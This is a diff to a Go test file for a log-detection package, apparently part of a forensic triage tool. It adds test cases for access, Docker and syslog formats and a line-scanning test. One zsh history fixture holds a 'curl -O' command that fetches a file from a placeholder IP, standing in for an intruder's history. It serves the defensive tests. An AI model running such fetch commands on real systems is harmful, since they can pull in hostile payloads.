@@ -1,8 +1,10 @@
 package logs
 
 import (
+	"context"
 	"encoding/binary"
 	"encoding/json"
+	"errors"
 	"strings"
 	"testing"
 	"unicode/utf8"
@@ -73,10 +75,14 @@ func TestDetect(t *testing.T) {
 		{`C:\triage\root\.bash_history`, "ls -la\n", KindBashHistory},
 		{".zsh_history", ": 1760216400:0;curl -O http://198.51.100.7/x\n", KindZshHistory},
 		{".history", ": 1760216400:0;id\n", KindZshHistory},
+		{"access.log", `203.0.113.9 - - [11/Oct/2026:21:00:00 +0000] "GET / HTTP/1.1" 200 12 "-" "curl/8.5.0"` + "\n", KindAccess},
+		{"abc-json.log", `{"log":"hello\n","stream":"stdout","time":"2026-10-11T21:00:00.1Z"}` + "\n", KindDocker},
 		{"notes.txt", "just some notes\n", KindUnknown},
 		{"auth.log", "", KindUnknown},
 		{"image.png", "\x89PNG\r\n\x1a\n\x00\x00", KindUnknown},
 		{"wtmp", "short", KindUnknown},
+		{"auth.log", strings.Repeat("\x00", 800) + "2026-10-11T21:00:00.1+00:00 web01 sshd[1]: x\n", KindSyslog},
+		{"auth.log", "Oct 11 21:00:01 web01 sshd[1]: a\n" + strings.Repeat("\x00", 3000), KindSyslog},
 	}
 	for _, tt := range tests {
 		if got := Detect(tt.name, []byte(tt.head)); got != tt.want {
@@ -106,4 +112,26 @@ func FuzzDetect(f *testing.F) {
 			t.Fatal("empty kind")
 		}
 	})
+}
+
+func TestScanLines(t *testing.T) {
+	in := "one\r\n" + strings.Repeat("x", 200) + "\nthree \xff\n\nlast"
+	var got []string
+	var nums []int
+	long, err := ScanLines(context.Background(), strings.NewReader(in), 100, func(n int, l string) error {
+		nums = append(nums, n)
+		got = append(got, l)
+		return nil
+	})
+	if err != nil || long != 1 {
+		t.Fatalf("long = %d, err = %v", long, err)
+	}
+	want := []string{"one", "three \uFFFD", "", "last"}
+	if strings.Join(got, "|") != strings.Join(want, "|") || nums[1] != 3 || nums[3] != 5 {
+		t.Errorf("lines = %q %v", got, nums)
+	}
+	stop := errors.New("stop")
+	if _, err := ScanLines(context.Background(), strings.NewReader("a\nb\n"), 10, func(int, string) error { return stop }); err != stop {
+		t.Errorf("err = %v", err)
+	}
 }
